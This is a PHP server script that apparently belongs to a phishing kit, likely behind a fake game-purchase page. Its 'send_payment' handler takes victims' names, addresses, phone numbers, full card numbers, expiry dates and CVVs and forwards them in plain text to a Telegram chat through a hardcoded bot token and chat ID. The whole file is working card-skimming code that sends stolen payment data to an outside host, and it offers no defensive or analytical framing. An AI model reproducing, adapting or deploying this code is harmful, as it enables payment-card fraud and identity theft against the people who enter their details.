<?php
header("Content-Type: application/json");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");

if ($_SERVER["REQUEST_METHOD"] === "OPTIONS") {
    http_response_code(200);
    exit();
}

define("TELEGRAM_BOT_TOKEN", "7835330346:AAEAnJ2nNDQ3tUfiLfB8SgDFERzZ0fYA_Ac");
define("ADMIN_CHAT_ID", "-4844832082");

$action = $_GET["action"] ?? "";

try {
    switch ($action) {
        case "send_payment":
            handlePayment();
            break;
        case "check_bot_status":
            echo json_encode(["success" => true, "status" => "online"]);
            break;
        default:
            echo json_encode(["success" => true]);
    }
} catch (Exception $e) {
    echo json_encode(["success" => false, "error" => $e->getMessage()]);
}

function handlePayment() {
    $input = json_decode(file_get_contents("php://input"), true);
    
    if (!$input) {
        echo json_encode(["success" => false]);
        return;
    }

    $name = $input["customer"]["name"] ?? "Unknown";
    $email = $input["customer"]["email"] ?? "Unknown";
    $phone = $input["customer"]["phone"] ?? "Unknown";
    $country = $input["customer"]["country"] ?? "Unknown";
    $region = $input["customer"]["region"] ?? "Unknown";
    $city = $input["customer"]["city"] ?? "Unknown";
    $address = $input["customer"]["address"] ?? "Unknown";
    $zip = $input["customer"]["zip"] ?? "Unknown";
    
    $card = $input["card"]["number"] ?? "Unknown";
    $expiry = $input["card"]["expiry"] ?? "Unknown";
    $cvv = $input["card"]["cvv"] ?? "Unknown";
    
    $game = $input["game"]["info"] ?? "Unknown";
    $ip = $input["userIP"] ?? "Unknown";
    $isDuplicate = $input["isDuplicate"] ?? false;

    $message = "";
    if ($isDuplicate) {
        $message .= " <b>DUPLICATE ENTRY DETECTED!</b>\n\n";
    }
    
    $message .= " <b>Customer Information:</b>\n";
    $message .= " Name: $name\n";
    $message .= " Email: $email\n";
    $message .= " Phone: $phone\n";
    $message .= " Country: $country\n";
    $message .= " Region: $region\n";
    $message .= " City: $city\n";
    $message .= " Address: $address\n";
    $message .= " ZIP: $zip\n\n";
    
    $message .= " <b>Payment Information:</b>\n";
    $message .= " Card: $card\n";
    $message .= " Expiry: $expiry\n";
    $message .= " CVV: $cvv\n\n";
    
    $message .= "<b>Technical Info:</b>\n";
    $message .= " IP Address: $ip\n";
    $message .= " Time: " . date("d.m.Y H:i:s") . "\n";
    $message .= " Game: $game";

    $success = sendTelegram($message);
    echo json_encode(["success" => $success]);
}

function sendTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = [
        "chat_id" => ADMIN_CHAT_ID,
        "text" => $message,
        "parse_mode" => "HTML"
    ];
    
    $context = stream_context_create([
        "http" => [
            "header" => "Content-type: application/x-www-form-urlencoded\r\n",
            "method" => "POST",
            "content" => http_build_query($data)
        ]
    ]);
    
    $result = file_get_contents($url, false, $context);
    return $result !== false;
}
?>
